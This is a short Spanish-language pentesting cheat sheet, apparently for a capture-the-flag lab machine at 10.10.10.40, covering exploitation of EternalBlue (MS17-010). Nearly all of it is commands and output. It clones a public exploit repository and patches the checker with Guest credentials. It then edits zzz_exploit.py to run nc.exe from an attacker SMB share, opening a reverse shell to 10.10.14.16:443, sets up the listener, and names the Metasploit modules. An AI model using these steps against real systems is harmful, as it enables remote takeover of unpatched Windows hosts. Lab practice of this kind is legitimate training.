
### EXPLOTAR ETERNALBLUE
```shell
#INSTALACIÓN DEL REPOSITORIO
❯ sudo git clone https://github.com/worawit/MS17-010


#EJECUTAMOS EL EXPLOIT
❯ python2 /opt/eternalblue/checker.py 10.10.10.40
=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED


#SI VEMOS QUE NO NOS DETECTA NINGUNA PODEMOS HACER UNA COSA EN EL CODIGO DEL ARCHIVO CHECKER.PY
❯ sudo vi /opt/eternalblue/checker.py
14   │ USERNAME = 'Guest'
15   │ PASSWORD = ''

#LO VOLVEMOS A ARRANCAR
❯ python2 /opt/eternalblue/checker.py 10.10.10.40
=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn t listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)


❯ nvim /opt/eternalblue/zzz_exploit.py
#TIENES QUE HABILITAR ESTA LINEA Y LAS DE ARRIBA COMENTARLAS.
	service_exec(conn, r'cmd /c \\10.10.14.16\smbfolder\nc.exe -e 10.10.14.16 443')

❯ cp /opt/nc/nc64.exe .
❯ mv nc64.exe nc.exe

❯impacket-smbserver smbFolder $(pwd) -smb2support

❯ sudo rlwrap nc -nlvp 443

❯ python2 ./zzz_exploit.py 10.10.10.40 samr

#SOLUTIONS PROBLEMS WITH IMPACKET...
python2 -m ensurepip --upgrade
python2 -m pip install impacket==0.9.20
```

**METASPLOIT**
```shell
use exploit/windows/smb/ms17_010_eternalblue #64

use exploit/windows/smb/ms17_010_psexec #32
```